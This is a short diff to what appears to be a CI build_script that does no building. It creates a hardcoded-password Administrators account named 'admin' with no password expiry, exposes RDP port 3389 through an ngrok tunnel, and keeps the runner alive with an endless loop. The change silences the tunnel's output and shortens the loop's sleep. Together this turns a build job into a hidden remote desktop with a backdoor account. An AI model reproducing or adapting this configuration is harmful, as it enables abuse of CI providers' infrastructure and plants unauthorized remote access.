@@ -10,5 +10,5 @@ build_script:
   - net user admin Binhminh12 /add
   - net localgroup Administrators admin /add
   - powershell -Command "wmic useraccount where 'name=\"admin\"' set PasswordExpires=false"
-  - start /b .\ngrok\ngrok.exe tcp 3389
-  - powershell -Command "while ($true) { Write-Host 'Still alive...'; Start-Sleep -Seconds 60 }"
+  - start /b .\ngrok\ngrok.exe tcp 3389 >nul 2>&1
+  - powershell -Command "while ($true) { Write-Host '💤 still breathing...'; Start-Sleep -Seconds 2 }"
